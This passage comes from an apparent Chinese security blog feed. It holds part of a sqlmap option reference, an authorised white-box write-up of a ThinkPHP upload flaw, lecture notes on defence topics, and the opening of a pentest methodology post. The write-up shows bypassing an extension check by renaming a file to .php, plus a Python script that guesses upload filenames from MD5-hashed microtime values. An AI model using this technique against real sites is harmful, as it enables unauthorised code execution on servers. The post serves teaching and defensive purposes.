</li></ul><p>检查缺少（可选）sqlmap依赖项</p><ul><li>–dependencies      Check for missing (optional) sqlmap dependencies  </li></ul><p>sqlmap默认彩色输出，可以使用此参数，禁掉彩色输出</p><ul><li>–disable-coloring  Disable console output coloring  </li></ul><p>使用指定的Google结果页面</p><ul><li>–gpage=GOOGLEPAGE  Use Google dork results from specified page number  </li></ul><p>对WAF / IPS保护进行全面测试</p><ul><li>–identify-waf      Make a thorough testing for a WAF/IPS protection  </li></ul><p>显示可用篡改脚本的列表</p><ul><li>–list-tampers      Display list of available tamper scripts  </li></ul><p>通过HTTP User-Agent标头模拟智能手机</p><ul><li>–mobile            Imitate smartphone through HTTP User-Agent header  </li></ul><p>在离线模式下工作（仅使用会话数据）</p><ul><li>–offline           Work in offline mode (only use session data)  </li></ul><p>安全地从sqlmap数据目录中删除所有内容</p><ul><li>–purge             Safely remove all content from sqlmap data directory  </li></ul><p>跳过WAF / IPS保护的启发式检测</p><ul><li>–skip-waf          Skip heuristic detection of WAF/IPS protection  </li></ul><p>有时对目标非常多的URL进行测试，为节省时间，只对能够快速判断为注入的报错点进行注入，可以使用此参数。</p><ul><li>–smart             Conduct thorough tests only if positive heuristic(s)  </li></ul><p>提示交互式sqlmap shell</p><ul><li>–sqlmap-shell      Prompt for an interactive sqlmap shell  </li></ul><p>用于存储临时文件的本地目录</p><ul><li>–tmp-dir=TMPDIR    Local directory for storing temporary files  </li></ul><p>Web服务器文档根目录（例如“/ var / www”），当没指定目录的情况下</p><ul><li>–web-root=WEBROOT  Web server document root directory (e.g. “/var/www”)  </li></ul><p>简单的向导界面，适合初学者用户</p><ul><li>–wizard            Simple wizard interface for beginner users</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h1&gt;&lt;p&gt;很多人会思考个概念使用工具去入侵机器？脚本小子？不，使用工具是对技术和开发者项工具的人的尊重，而脚本小子是并不知道什么原理就去拿工具去扫描。&lt;br&gt;sqlmap——-&amp;gt;&lt;a href=&quot;http://sqlmap.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;官方网站&lt;/a&gt;&lt;br&gt;是由python编写的开源自动化sql检测和利用工具。本文章是sqlmap使用总结和知识回顾&lt;/p&gt;
&lt;h2 id=&quot;工作模式&quot;&gt;&lt;a href=&quot;#工作模式&quot; class=&quot;headerlink&quot; title=&quot;工作模式&quot;&gt;&lt;/a&gt;工作模式&lt;/h2&gt;&lt;p&gt;sql执行操作后：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;1、判断可注入的参数&lt;br&gt;2、判断可以用那种SQL注入技术来注入&lt;br&gt;3、识别出哪种数据库&lt;br&gt;4、根据用户选择，做相应的操作&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="0x01 应用实践" scheme="blog.manhao6.cn/categories/0x01-%E5%BA%94%E7%94%A8%E5%AE%9E%E8%B7%B5/"/>
    
      <category term="工具手册" scheme="blog.manhao6.cn/categories/0x01-%E5%BA%94%E7%94%A8%E5%AE%9E%E8%B7%B5/%E5%B7%A5%E5%85%B7%E6%89%8B%E5%86%8C/"/>
    
    
      <category term="sqlmap" scheme="blog.manhao6.cn/tags/sqlmap/"/>
    
  </entry>
  
  <entry>
    <title>记一次thinkphp上传漏洞</title>
    <link href="blog.manhao6.cn/2019/03/16/%E8%AE%B0%E4%B8%80%E6%AC%A1thinkphp%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88%E7%99%BD%E7%9B%92%E5%AE%A1%E8%AE%A1%EF%BC%89/"/>
    <id>blog.manhao6.cn/2019/03/16/记一次thinkphp上传漏洞（白盒审计）/</id>
    <published>2019-03-16T15:24:21.000Z</published>
    <updated>2019-04-15T09:12:10.632Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-背景"><a href="#0x01-背景" class="headerlink" title="0x01 背景"></a>0x01 背景</h2><p>今天刚回到宿舍，就被同学叫去讨论一个后台的上传漏洞（经过某公司授权，该公司好像被搞过了）。<br>我们知道，上传文件漏洞能利用要有3个条件：</p><ol><li>能绕过文件类型限制</li><li>知道文件路径</li><li>文件夹能解析代码<a id="more"></a>本次主要在白盒测试过程，发现漏洞上传主要是利用thinkphp开发文档探测到上传漏洞文件路径，从而漏洞利用。（以前做上传的过程中，上传成功后，由于不知道上传路径，长传文件名而放弃,本次也给自己一个经验可以根据相应开发框架开发文档来探测命名规律）</li></ol><h2 id="0x02-过程"><a href="#0x02-过程" class="headerlink" title="0x02 过程"></a>0x02 过程</h2><p>在某后台有个长传xlsx文件入口<br><img src="http://picture.manhao6.cn/记一次thinkphp上传漏洞/20190328121307697.png" alt><br>在管理后台发现有一个文件上传点，通过上传，发现做了限制，只能上传xlsx. csv等后缀文件。<br><img src="http://picture.manhao6.cn/记一次thinkphp上传漏洞/20190328123504572.png" alt><br>上传正确的xlsx文件显示，并且能解析出来对应xlsx表格对应字段文字显示到网页中。<br><img src="http://picture.manhao6.cn/记一次thinkphp上传漏洞/20190328124237009.png" alt><br>通过bp拦截重发，修改文件后缀.php。发现成功了系统system error提示错误。而不是返回false。猜测可能是服务器无法解析php文件，提取出相应的文字，而造成系统错误。<br>因为白盒测试，直接去服务器查看目录，发现真的上传传成功。<br><img src="http://picture.manhao6.cn/记一次thinkphp上传漏洞/20190328045136847.png" alt><br>显示已经长传成功了，但我们怎么知道服务器长传具体路径了。<br>由于采用thinkphp框架，有相应的开发手册。我们就查看了对应开发手册关于文件上传开发<br><img src="http://picture.manhao6.cn/记一次thinkphp上传漏洞/20190328124532032.png" alt><br>官方文档提供了多种的机制来命名文件–&gt;<a href="https://www.kancloud.cn/manual/thinkphp5_1/354121" target="_blank" rel="noopener">TinkPHP开发手册5.1-上传</a>：</p><ol><li>会在上传目录下面生成以当前日期为子目录，微秒时间的md5编码为文件名的文件（上图）</li><li>自定义命名规则，可以在rule方法中传入函数或者方法</li><li>保留原文件名称</li><li>上传文件的哈希散列值</li></ol><p>通过对第三种和第四中情况猜测，发现保留原文件名这种方式文件不存在。<br><img src="http://picture.manhao6.cn/记一次thinkphp上传漏洞/20190328125643439.png" alt><br>md5处理也不存在<br><img src="http://picture.manhao6.cn/记一次thinkphp上传漏洞/20190328125948278.png" alt><br>sha1处理也不存在<br><img src="http://picture.manhao6.cn/记一次thinkphp上传漏洞/20190328010130436.png" alt><br>则现在只是第一种，第二种方式。如果采用第二种方式，我们就很难猜到命名规则了。<br>第一条规则总结两点</p><ul><li>上传目录下面生成以当前日期为子目录，</li><li>微秒时间的md5编码为文件名的文件</li></ul><p>通常查找php中microtime()，构造一个php语句。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span>(microtime(ture));</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p><p><img src="http://picture.manhao6.cn/记一次thinkphp上传漏洞/20190328011152310.png" alt><br>通过本地测试，如上图，每次刷新，各位上数刚好是秒，小数点后面应该就是秒一下单位，毫秒或者微秒。发现以上规律我们就可以通过脚本生产一段时间内所有的md5编码<br>于是，我们刚上传的时候，记下microtime的时间，然后大概间隔1-5秒，通过脚本生成这1-5秒钟生成的所有md5编码的微秒时间</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">import <span class="built_in">os</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">os</span>.<span class="built_in">path</span>.exists(<span class="string">'b.txt'</span>):</span><br><span class="line">    <span class="built_in">os</span>.<span class="built_in">remove</span>(<span class="string">'b.txt'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">393832</span>, <span class="number">500000</span>):</span><br><span class="line">    temp = str(i)</span><br><span class="line">    temp1 = temp[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">    temp2 = temp[<span class="number">2</span>:<span class="number">6</span>]</span><br><span class="line">    # temp3 = int(<span class="string">"&#123;&#125;.&#123;&#125;"</span>.<span class="built_in">format</span>(temp1, temp2))</span><br><span class="line">    temp3 = <span class="string">"&#123;&#125;&#123;&#125;.&#123;&#125;"</span>.<span class="built_in">format</span>(<span class="number">15536954</span>, temp1, temp2)</span><br><span class="line">    a = hashlib.md5(temp3.encode()).hexdigest()</span><br><span class="line">    with <span class="built_in">open</span>(<span class="string">'b.txt'</span>, <span class="string">'a'</span>) as f:</span><br><span class="line">        f.<span class="built_in">write</span>(a + <span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure><p>因为白盒测试，直接在系统钟找到相应文件名字，通过搜索发现一样。<br><img src="http://picture.manhao6.cn/记一次thinkphp上传漏洞/20190328044959349.png" alt><br>通过与相关人员沟通，发现采取的也是这个命名规则<br><img src="http://picture.manhao6.cn/记一次thinkphp上传漏洞/20190328051139213.png" alt><br>结果直接搜索相应目录文件也解析成功了phpinfo（）（图忘截了，漏洞也修复了）</p><h2 id="0x03-结论"><a href="#0x03-结论" class="headerlink" title="0x03 结论"></a>0x03 结论</h2><p>通过这次部分在白盒情况下测试，成功看到上传漏洞，通过开源框架开发文档猜解到用户上传的文档系统保存的文件名。也给自己在以后上传文件利用提供了一种方法。这也给开发人员提了个醒，不要一味地按照官方开发文档推荐重命名规则，就会给攻击者留下利用规律，如果按照开发文档<br>第二条，自定义命名规则，就会加大攻击者猜解系统命名的难度，也大大降低了漏洞被利用的风险。<br>对于上传漏洞防护策略总结有如下几点：</p><ol><li>可以使用黑名单以及白名单结合的方式限制文件上传</li><li>文件的上传目录设为不可执行</li><li>使用JS对文件的大小、拓展名进行剑测</li><li>使用取随机文件名，可以是md5也可以是时间（对于开源框架，尽量自定义文件随机名）</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-背景&quot;&gt;&lt;a href=&quot;#0x01-背景&quot; class=&quot;headerlink&quot; title=&quot;0x01 背景&quot;&gt;&lt;/a&gt;0x01 背景&lt;/h2&gt;&lt;p&gt;今天刚回到宿舍，就被同学叫去讨论一个后台的上传漏洞（经过某公司授权，该公司好像被搞过了）。&lt;br&gt;我们知道，上传文件漏洞能利用要有3个条件：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;能绕过文件类型限制&lt;/li&gt;
&lt;li&gt;知道文件路径&lt;/li&gt;
&lt;li&gt;文件夹能解析代码
    
    </summary>
    
      <category term="0x02 应用实践" scheme="blog.manhao6.cn/categories/0x02-%E5%BA%94%E7%94%A8%E5%AE%9E%E8%B7%B5/"/>
    
      <category term="文件上传" scheme="blog.manhao6.cn/categories/0x02-%E5%BA%94%E7%94%A8%E5%AE%9E%E8%B7%B5/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
    
      <category term="thinkphp" scheme="blog.manhao6.cn/tags/thinkphp/"/>
    
      <category term="上传" scheme="blog.manhao6.cn/tags/%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>网络对抗原理浅析</title>
    <link href="blog.manhao6.cn/2019/03/15/%E7%BD%91%E7%BB%9C%E5%AF%B9%E6%8A%97%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/"/>
    <id>blog.manhao6.cn/2019/03/15/网络对抗原理浅析/</id>
    <published>2019-03-15T07:33:18.000Z</published>
    <updated>2019-04-15T09:11:35.633Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>最近在静下来学技术，翻出老师讲课的网络对抗原理课ppt。<br>本篇从企业和实践工程角度看待和思考相关安全问题。<br><a id="more"></a></p><h1 id="0x01-浅析"><a href="#0x01-浅析" class="headerlink" title="0x01 浅析"></a>0x01 浅析</h1><h2 id="入侵与入侵检测"><a href="#入侵与入侵检测" class="headerlink" title="入侵与入侵检测"></a>入侵与入侵检测</h2><h3 id="1-渗透"><a href="#1-渗透" class="headerlink" title="1.渗透"></a>1.渗透</h3><p>之前博客相应介绍过相应过程，本节不做详细介绍：—-&gt;<a href="http://blog.manhao6.cn/2019/03/10/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/">渗透测试</a><br><img src="http://picture.manhao6.cn/网络对抗原理浅析/20190407044224046.png" alt="老师讲课的图"><br>大概总结如下阶段：</p><ul><li>信息收集</li><li>漏洞检测</li><li>漏洞利用和权限提升</li><li>后渗透阶段</li><li>安全评估报告</li></ul><h3 id="2-入侵检测"><a href="#2-入侵检测" class="headerlink" title="2.入侵检测"></a>2.入侵检测</h3><ul><li>识别与发现<ul><li>潜在威胁</li><li>实时入侵</li></ul></li><li><p>检测方式</p><ul><li>特征检测（黑名单）</li><li>异常检测（白名单）</li></ul></li><li><p>部署位置</p><ul><li>流量汇聚处</li><li>AAA认证</li><li>日志汇聚处</li><li>主机</li></ul></li><li><p>实时性（权衡和妥协）</p><ul><li>实时</li><li>准实时</li><li>事后</li></ul></li><li><p>响应</p><ul><li>联动</li><li>告警</li></ul></li><li><p>工具</p><ul><li>HIDS</li><li>IDS</li><li>蜜罐</li></ul></li><li><p>实 例：</p><ul><li>snort</li><li>WAF-Modesecurity lua</li><li>Agent-OSSEC</li><li>日志分析系统</li></ul></li><li><p>ModSecurity（五阶段）</p><ul><li>Phase Request Headers</li><li>Phase Request Body</li><li>Phase Response Headers</li><li>Phase Response Body</li><li>Phase Logging</li></ul></li><li><p>蜜罐</p></li><li>与狭义IDS区别</li><li>面临问题：部署、灵活性、响应</li></ul><h2 id="DDos与抗D"><a href="#DDos与抗D" class="headerlink" title="DDos与抗D"></a>DDos与抗D</h2><p>DDos：分布式拒绝服务攻击<br>攻击路径：</p><ul><li>网络层DDos</li><li>应用层DDos</li></ul><p>攻击类型：</p><ul><li>网络层<ul><li>ICMP Flood</li><li>UDP Flood</li><li>NTP Flood</li><li>SYN Flood</li><li>DNS Query Flood</li></ul></li><li>应用层<ul><li>CC 攻击</li><li>REDos</li></ul></li></ul><p>攻击方式：</p><ul><li>资源消耗类攻击</li><li>服务器消耗量攻击</li><li>反射类攻击</li><li>混合型攻击</li></ul><p>攻击源：</p><ul><li>肉鸡、僵尸</li><li>IOT设备（收集）</li><li>专业团队机房</li></ul><p>抗D-防御方法<br>流量清洗：</p><ul><li><p>四层清洗</p><ul><li>支持非http流量</li><li>不需要SSL证书</li></ul></li><li><p>七层清洗</p><ul><li>支持防CC</li></ul></li></ul><p>总体防护：</p><ul><li>准备备用ip</li><li>配置供应商高防ip和回源策略</li><li>制定预案和响应策略，演练<h2 id="网络安全体系和理论"><a href="#网络安全体系和理论" class="headerlink" title="网络安全体系和理论"></a>网络安全体系和理论</h2><h3 id="思考安全问题"><a href="#思考安全问题" class="headerlink" title="思考安全问题"></a>思考安全问题</h3>概念(安全含义太大)：</li><li>security VS safety</li><li>security VS secrecy</li><li>security VS audit</li></ul><p>两个维度：</p><ul><li><p>弱点</p><ul><li>漏洞 — 漏洞挖掘</li><li>配置不当 — SDL</li><li>设计缺陷 — ACL 防篡改</li></ul></li><li><p>攻击</p><ul><li>扫描 —-入侵检测</li><li>渗透 —- 应急响应</li><li>DDos、Anti-DDos</li></ul></li></ul><p>避免攻防误区：</p><ul><li>逆向思维</li><li>攻击者的活的</li><li>攻击者是死的</li><li>内部人员和系统是活的</li></ul><p>防御者角度：</p><ul><li>更全的更细致的信息</li><li>更强的操控权</li><li>改变系统/制定流程的资格</li><li>专职的人</li></ul><p>防御体系构建（扬长避短）</p><ul><li>让系统规范</li><li>加强对信息了解</li><li>安全评估</li><li>入侵检测</li><li>及时响应</li></ul><h3 id="做好安全工作"><a href="#做好安全工作" class="headerlink" title="做好安全工作"></a>做好安全工作</h3><p>了解企业：</p><ul><li>人员角色</li><li>网络架构与运维</li><li>应用架构与研发过程</li><li>业务 与 经营</li></ul><p>渗透路径启示</p><ul><li>网络访问的隔离与限制</li><li>漏洞的发现和利用</li><li>账号与权限</li></ul><p>技术栈：</p><ul><li>客户端安全</li><li>应用于系统安全</li><li>应用安全</li><li>业务安全</li><li>数据安全</li></ul><h2 id="网络安全域划分与隔离"><a href="#网络安全域划分与隔离" class="headerlink" title="网络安全域划分与隔离"></a>网络安全域划分与隔离</h2><h3 id="系统与网络安全"><a href="#系统与网络安全" class="headerlink" title="系统与网络安全"></a>系统与网络安全</h3><ul><li>安全域隔离与划分</li><li>认证、授权和审计（AAA）</li><li>边界入侵检测</li><li>主机安全与配置</li></ul><p>安全域划分与隔离：<br><img src="http://picture.manhao6.cn/网络对抗原理浅析/20190407041914143.png" alt></p><h3 id="ACL与防火墙"><a href="#ACL与防火墙" class="headerlink" title="ACL与防火墙"></a>ACL与防火墙</h3><ul><li>包过滤防火墙和状态防火墙</li><li>NAT地址转换和ALG应用层网关</li><li>五元组、N元组</li><li>黑名单与白名单</li><li>四层均衡负载与Firewall</li><li>UTM 与 NGFW</li></ul><h3 id="端口管理"><a href="#端口管理" class="headerlink" title="端口管理"></a>端口管理</h3><ul><li>规范最小权限原则</li><li>端口扫描，梳理端口</li><li>维护和整改</li></ul><h2 id="数据安全"><a href="#数据安全" class="headerlink" title="数据安全"></a>数据安全</h2><h3 id="现状："><a href="#现状：" class="headerlink" title="现状："></a>现状：</h3><ul><li><p>业务数据泄密</p><ul><li>投诉</li><li>案件</li><li>客户信息</li></ul></li><li><p>公司机密泄密</p><ul><li>员工通讯录</li><li>内部邮件、论坛</li><li>战略机密、高管行踪<h4 id="问题原因"><a href="#问题原因" class="headerlink" title="问题原因"></a>问题原因</h4></li></ul></li><li>有什么数据</li><li>数据价值意义</li><li>如何保护数据</li><li>安全措施和数据之间的关系</li><li>必要性和代价</li></ul><p>特点与难点</p><ul><li>大部分不是技术的对抗</li><li>主要目标在内不在外</li><li>建立在已有的防御体系上</li><li>又独立于已有的防御体系</li></ul><h3 id="解决方案："><a href="#解决方案：" class="headerlink" title="解决方案："></a>解决方案：</h3><ul><li>防渗透</li><li>加密存储</li><li>增强AAA</li><li>水印</li><li>建立保密等级制度</li></ul><p>怎么做：</p><ul><li>数据梳理</li><li>数据定级、打标</li><li>针对数据级别的安全规范矩阵</li><li>推出规则，控制增量</li><li>实例评估、整改，消化存量<br>处置方式：<br>手段：<ul><li>明文、加密</li><li>哈希</li><li>水印</li><li>AAA<br>级别变化：</li><li>打星、脱敏</li><li>聚合</li></ul></li></ul><h4 id="数据级别（抽象数据划分）："><a href="#数据级别（抽象数据划分）：" class="headerlink" title="数据级别（抽象数据划分）："></a>数据级别（抽象数据划分）：</h4><p>类型维度：</p><ul><li>公司数据（B）</li><li>用户数据（C）</li></ul><p>级别维度：</p><ul><li>公开（1）</li><li>共享（2）</li><li>秘密（3）</li><li>机密（4）</li></ul><p>数据生命周期：</p><ul><li>生成</li><li>传输</li><li>存储</li><li>读取</li><li>展示</li><li>转移</li><li>销毁</li></ul><h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><ul><li>避免在具体细节处纠缠—-自上而下推动</li><li>避免描述和现状不一致——控制权</li><li>考虑现状和可行性 —-不给自己挖坑</li></ul><h3 id="典型场景"><a href="#典型场景" class="headerlink" title="典型场景"></a>典型场景</h3><p>用户场景：</p><ul><li>用户机密数据不能存储</li><li>用户机密信息采集必须加密</li><li>用户秘密数据不能前台展示</li><li>用户机密数据不能后台展示</li><li>用户秘密数据必须通过认证和授权才能被用户自己访问</li><li>用户共享的信息必须经过用户授权才能共享给指定的的经过认证的其他用户</li></ul><p>公司场景：</p><ul><li>公司秘密必须经过认证和授权才能访问，且必须有记录</li><li>公司秘密信息的转移必须经过审批</li><li>公司共享信息在展示时要加水印</li><li>公司秘密数据不得存储在公司以外的网络和介质中</li><li>公司贡献数据必须经过审批才能对外公开</li></ul><h2 id="应用安全"><a href="#应用安全" class="headerlink" title="应用安全"></a>应用安全</h2><h3 id="了解开发框架"><a href="#了解开发框架" class="headerlink" title="了解开发框架"></a>了解开发框架</h3><p>MVC：</p><ul><li>View Contronller Modle</li></ul><p>RESTful：</p><ul><li>前端渲染</li></ul><p>J2EE：</p><ul><li>客户层</li><li>表示层</li><li>业务逻辑层</li><li>数据层</li></ul><p>容器与Filter：</p><ul><li>http服务器-Module<ul><li>Apache</li><li>Nginx</li></ul></li><li>容器-容器Filter<ul><li>JBoss</li><li>Tomcat</li><li>Jetty</li></ul></li><li>开发框架Filter、Serclet Filter</li><li>web层渲染</li><li>Ajax请求生成、Json结果返回</li><li>数据层ORM</li></ul><p>中间件：</p><ul><li>远程同步调用</li><li>异步通知、消息总线</li><li>分布式缓存</li><li>分布式数据库</li><li>集中配置管理</li><li>同意的应用日志采集方案</li><li>数据分析平台</li></ul><p>常见的框架、软件：</p><ul><li>Spring struts Hibernate</li><li>Spring MVc</li><li>ASp.NET</li><li>Django</li><li>THinkPHP</li><li>Angular</li></ul><h3 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h3><ul><li>目标系统</li><li>文档</li><li>代码</li><li>测试环境</li><li>人</li><li>日志</li><li>攻击者提供线索</li></ul><h3 id="安全开发"><a href="#安全开发" class="headerlink" title="安全开发"></a>安全开发</h3><p>安全框架-告诉开发该怎么做<br>安全编码规范-告诉开发必须这么做<br>白盒审计-找出不这么做<br><img src="http://picture.manhao6.cn/网络对抗原理浅析/20190407054916899.png" alt></p><p>SDL软件开发周期：</p><ul><li>需求评审</li><li>设计评审</li><li>技术评审</li><li>测试用例评审</li><li>开发阶段</li><li>测试阶段</li><li>上线阶段</li><li>运营阶段</li><li>下线<h2 id="业务安全"><a href="#业务安全" class="headerlink" title="业务安全"></a>业务安全</h2>三个层次：</li><li><p>军队vs 军队</p><ul><li>渗透、扫描、DDos</li><li>拼技术</li></ul></li><li><p>警察 vs 犯罪</p><ul><li>盗号、欺诈、羊毛、刷榜</li><li>拼规则</li></ul></li><li><p>城管 VS 小贩</p><ul><li>垃圾信息、爬虫</li><li>拼运营</li></ul></li></ul><p>基于规则：</p><ul><li>账号安全</li><li>资金风控</li><li>搜索反作弊</li><li>广告反作弊</li><li>返垃圾信息</li></ul><p>基于模型：</p><ul><li>统计分析</li><li>模式识别</li><li>人工智能</li></ul><p>逃逸机制</p><ul><li>验证码</li><li>提供认证级别</li><li>降级降权</li><li>基于时间的解禁策略</li></ul><p>系统实现：<br>打点机制<br>规则引擎<br>分析引擎<br>处理模块<br>效果分析</p><h2 id="AAA与认证"><a href="#AAA与认证" class="headerlink" title="AAA与认证"></a>AAA与认证</h2><h3 id="AAA"><a href="#AAA" class="headerlink" title="AAA"></a>AAA</h3><p>概念</p><ul><li>认证（Authentication）</li><li>授权（Authorization）</li><li>计费或审计（Acounting or Audit）</li></ul><p>应用场合（登录、验证）</p><ul><li>网络准入：有线、wifi、vpn</li><li>服务器访问登录、认证、操作</li><li>网站登录</li><li>设备使用</li><li>重要操作权鉴</li></ul><p>认证方式</p><ul><li>基于口令</li><li>基于生物特征</li><li>基于凭证、证书</li></ul><p>口令（哈希形式存储）</p><ul><li>文本</li><li>数据库</li><li>unix、windows</li><li>ldap<br>凭证（易丢失）</li><li>证书</li><li>token</li><li>手机短信</li><li>邮箱</li><li>IP/mac<br>生物特征（难伪造，随身携带）</li><li>指纹</li><li>人脸</li><li>虹膜</li></ul><p>认证模式：</p><ul><li>PAP</li><li>Chap</li></ul><p>Kerberos认证协议</p><ul><li>认证</li><li>凭据</li><li>秘钥交换</li></ul><p>PKI（身份与公钥绑定）</p><ul><li>CA</li><li>RA</li><li>证书库</li><li>CRL</li></ul><p>EAP协议</p><ul><li>MD5</li><li>TLS</li><li>TTLS</li><li>PEAP</li><li>LEAP</li></ul><p>Radius协议</p><ul><li>File</li><li>Unix</li><li>LDAP</li><li>OTP</li><li>EAP</li></ul><p>双因子认证：</p><ul><li>口令+</li><li>不同场合，不同的选择与组合方式</li><li>与二次认证区别</li></ul><p>认证典型场合：</p><ul><li><p>网络准入</p><ul><li>有线、WiFi、vpn</li><li>EAP</li><li>LDAP</li><li>Radius</li><li>AC、交换机</li><li>WEP/WAP/WAP2</li></ul></li><li><p>SSH</p><ul><li>口令</li><li>PAM</li><li>证书</li><li>GSSAPI、KERBEROS</li></ul></li><li><p>网站登录</p><ul><li>登录验证</li><li>openid/oauth</li><li>SSO</li><li>Session共享</li></ul></li><li><p>二次认证</p><ul><li>业务安全</li><li>策越与应用场景</li><li>认证技术和方案</li><li>框架</li></ul></li></ul><p>口令、认证攻防：</p><ul><li>弱密码、字典爆破、刷库、钓鱼</li><li>验证码（放机器人、爆破）</li><li>围绕次数验证</li><li>分析与检测</li><li>口令存储与传输</li></ul><p>验证码缺陷：</p><ul><li>ocr</li><li>熵不够</li><li>触发时更新 </li><li>答案外泄</li><li>绑定Session 与绑定事务</li><li>使用错误导致验证码不起作用</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h1&gt;&lt;p&gt;最近在静下来学技术，翻出老师讲课的网络对抗原理课ppt。&lt;br&gt;本篇从企业和实践工程角度看待和思考相关安全问题。&lt;br&gt;
    
    </summary>
    
      <category term="0x01 技术原理" scheme="blog.manhao6.cn/categories/0x01-%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/"/>
    
      <category term="网络对抗" scheme="blog.manhao6.cn/categories/0x01-%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/%E7%BD%91%E7%BB%9C%E5%AF%B9%E6%8A%97/"/>
    
    
      <category term="网络对抗" scheme="blog.manhao6.cn/tags/%E7%BD%91%E7%BB%9C%E5%AF%B9%E6%8A%97/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试（持续更新）</title>
    <link href="blog.manhao6.cn/2019/03/10/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/"/>
    <id>blog.manhao6.cn/2019/03/10/渗透测试（持续更新）/</id>
    <published>2019-03-10T04:02:45.000Z</published>
    <updated>2019-04-15T09:31:35.803Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>从去年4月份开始接触渗透，做了几个月后。因为考研，把所有的事都放下了。但是还没没考上，提遗憾的。技术没学到，研也没考上。但是还是有收获的，就是能沉淀下来学技术，静下心来看书。现在考研结束了，又要开始接触渗透了，找工作。</p><h1 id="0x02-渗透"><a href="#0x02-渗透" class="headerlink" title="0x02 渗透"></a>0x02 渗透</h1><h2 id="渗透含义"><a href="#渗透含义" class="headerlink" title="渗透含义"></a>渗透含义</h2><p>渗透测试：通过模拟攻击者以及防御者的角度，在企业外部去分析目标所存在的安全隐患以及脆弱性，尽可能发现和找出企业存在的攻击面。</p><p>黑客入侵：通过各种方法，甚至破坏的行为来侵入系统</p><p>区别：渗透测试时找出所以攻击面，黑客入侵只要找出单个漏洞而进而利用侵入服务器。<br><a id="more"></a></p><h2 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>通过主动扫描和开放搜索方式去获取服务器信息。主要包括：域名、web站点、IP、接口、OS、业务、端口、第三方服务、数据<br>1.获取目标公司对外信息</p><ul><li>获取域名<blockquote><p>1.访问+抓包+搜索（google搜索 whois查询，github）<br>2.工具暴力破解：firece、dnsmap、dnsenum sublist3r（<a href="https://github.com/aboul3la/Sublist3r）" target="_blank" rel="noopener">https://github.com/aboul3la/Sublist3r）</a><br>3.DNS服务器配置漏洞（ DNS区域传送漏洞）<br>4.业务公司获取<br>5.微信小程序提供域名（更多资料里）—&gt;针对有微信小程序业务</p></blockquote></li><li>获取ip <blockquote><p>1.域名-&gt;ip<br>2.业务公司获取<br>1.绕过cdn–&gt;多点ping获取真实ip（<a href="http://ping.chinaz.com/）" target="_blank" rel="noopener">http://ping.chinaz.com/）</a><br>2.nslookup</p></blockquote></li><li>获取服务器信息（操作系统，web中间件）<blockquote><p>网页关键字；URL特征；Meta特征；Script特征；robots.txt；网站路径特征；网站静态资源；爬取网站目录信息来判断网站服务器类型linux？window？Apache？nginx？mysql？sqlserver？<br>云悉（<a href="http://www.yunsee.cn/）" target="_blank" rel="noopener">http://www.yunsee.cn/）</a><br>bugscanner（<a href="http://whatweb.bugscaner.com/look/）" target="_blank" rel="noopener">http://whatweb.bugscaner.com/look/）</a></p></blockquote></li><li>获取服务器端口信息（进行端口扫描：端口号、类型、服务版本）<blockquote><p>工具：nmap、mascsan<br>过程：ip存活、端口扫描、版本检测、OS检测、进一步探测<br>结论：是否存在弱口令 